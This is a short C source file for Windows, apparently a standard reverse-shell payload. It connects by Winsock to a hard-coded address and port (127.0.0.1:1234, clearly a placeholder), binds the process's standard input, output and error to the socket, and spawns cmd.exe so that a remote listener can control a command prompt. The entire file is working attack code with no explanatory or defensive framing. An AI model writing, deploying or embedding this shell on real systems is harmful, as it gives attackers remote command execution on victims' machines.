#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

void main() {
    WSADATA wsaData;
    SOCKET Winsock;
    SOCKET Sock;
    struct sockaddr_in hax;
    char ip_addr[16] = "127.0.0.1";
    STARTUPINFO ini_processo;
    PROCESS_INFORMATION processo_info;

    // Initialize winsock
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

    // Set up our socket structure
    struct hostent *host;
    host = gethostbyname(ip_addr);
    memset(&hax,0,sizeof(hax));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(1234);
    hax.sin_addr.s_addr = *((unsigned long*)host->h_addr);

    // Attempt to connect to the remote server
    WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);

    // Redirect stdin, stdout, and stderr to the socket
    memset(&ini_processo,0,sizeof(ini_processo));
    ini_processo.cb=sizeof(ini_processo);
    ini_processo.dwFlags=STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    // Start the shell
    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&processo_info);
}

